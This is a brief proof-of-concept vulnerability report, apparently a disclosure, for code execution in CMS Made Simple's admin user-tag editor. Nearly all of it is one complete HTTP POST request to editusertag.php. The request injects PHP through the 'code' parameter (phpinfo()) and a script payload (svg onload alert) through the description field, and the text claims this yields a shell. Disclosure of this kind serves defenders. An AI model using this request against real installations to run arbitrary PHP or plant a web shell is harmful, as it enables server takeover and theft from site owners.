
## Code Execution  
In the extension module, user custom tags
The user can insert any PHP code and execute it, resulting in getshell.


### poc

parameter 'code'

   ```
   POST /cmsms/admin/editusertag.php?_sk_=9687e2d35edeb56100c&userplugin_id=3 HTTP/1.1
Host: 127.0.0.1
Content-Length: 158
Accept: */*
Origin: http://127.0.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: 76ebf50c96b1db28a5787356b7b6a170=76b2219abe67ede483a103746fc5293a3840b2f6%3A%3AYTo1OntzOjM6InVpZCI7aToxO3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NzoiZWZmX3VpZCI7TjtzOjEyOiJlZmZfdXNlcm5hbWUiO047czo1OiJja3N1bSI7czo0MDoiYzg3ZmQ0YjE4NDNmYWZjNzQyOTVmNTY1MTNlNGUzYWJlZjA0OTk2NiI7fQ%3D%3D; _sk_=9687e2d35edeb56100c; u=0b08f08a7dc7e236549449d423f7db17a1be2595; CMSIC3390714ec7=a0cm17ne3buacgnn0c36l6end2; CMSSESSIDab08e15a2ef7=tdrfle5gdlfgd46lm3ufm4as60
Connection: close

_sk_=9687e2d35edeb56100c&userplugin_id=3&userplugin_name=rr&code=phpinfo()%3B&description=%3Csvg%2Fonload%3Dalert(1)%3E&code=phpinfo()%3B&run=1&apply=1&ajax=1
   ```

![](https://hexoblog-1253112764.file.myqcloud.com/cmsms-code-execution.png)

    
